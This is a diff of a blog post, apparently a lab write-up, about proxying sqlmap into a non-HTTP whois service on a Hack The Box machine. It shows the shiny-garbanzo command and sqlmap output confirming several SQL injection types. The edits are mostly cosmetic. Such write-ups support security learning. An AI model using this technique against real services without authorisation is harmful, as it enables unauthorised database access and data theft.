@@ -1,13 +1,13 @@
 ---
-title: Introducing SQLMAP into non-HTTP services.
+title: Introducing sqlmap® into non-HTTP services.
 published: false
 ---
 
 ## The problem:
 
-Lately, I was introduced to an interesting problem. How to automate the SQL injection exploitation of non-HTTP service? Sometimes services like `whois` are using custom SQL databases, which is an ideal situation to introduce unwanted problems. Because of that, the `whois` service is working on a non-retired HTB box I can't do it very detailed but you should be able to take advantage of the idea itself to create your custom proxies. Let's start by diving into the information on how sqlmap actually works.
+Lately, I was introduced to an interesting problem. How to automate the SQL injection exploitation of non-HTTP service? Sometimes services like `whois` are using custom SQL databases, which is an ideal situation to introduce unwanted problems. Because of that, the `whois` service is working on a non-retired HTB box, I can't do it very detailed, but you should be able to take advantage of the idea itself to create your custom proxies. Let's start by diving into the information on how sqlmap works.
 
-## SQLMAP:
+## sqlmap®:
 
 You should already know that it can automate the SQL injection attack using requests to HTTP/S sites and some magic :) While passing an interesting HTTP request or URL to it, it can test all parameters, no matter if it is GET or POST or even HTTP header based injection point. But what to do when you know that your non-HTTP service is prone to SQL injection attack? You can exploit it manually which is recommended for learning sake or use a tool that is dedicated to that service being able to communicate with it and script your way into.
 
@@ -23,7 +23,10 @@ https://github.com/haqpl/shiny-garbanzo
 
 ## Working example:
 
-Below you can see an example usage of `shiny-garbanzo` and the corresponding output of SQLMAP, which identified and successfully exploited four different types of SQLi vulnerability in non-HTTP service.
+Below you can see an example usage of `shiny-garbanzo` and the corresponding output of sqlmap, which identified and successfully exploited four different types of SQLi vulnerability in non-HTTP service.
+
+
+{% include figure.html file="/assets/shiny-garbanzo.png" alt="/assets/shiny-garbanzo.png" max-width="500px" number="1" caption="SQL injection in non-HTTP service." %}
 
 ```
 python3 shiny-garbanzo.py --host '127.0.0.1' --tool "whois" --port 1337 --arguments="-h 10.10.10.155 SQLMAP"
@@ -65,13 +68,7 @@ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
 [18:20:25] [WARNING] reflective value(s) found and filtering out
 [18:20:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
 [18:20:27] [INFO] POST parameter 'cmd' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable 
-[18:20:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
-[18:20:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
-[18:20:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
-[18:20:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
-[18:20:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
-[18:20:27] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
-[18:20:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+...
 [18:20:27] [INFO] POST parameter 'cmd' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
 [18:20:27] [INFO] testing 'MySQL inline queries'
 [18:20:27] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
@@ -129,6 +126,8 @@ Database: information_schema
 [*] ending @ 18:20:45 /2019-10-23/
 
 ```
+
+
 
 ## Credits:
 
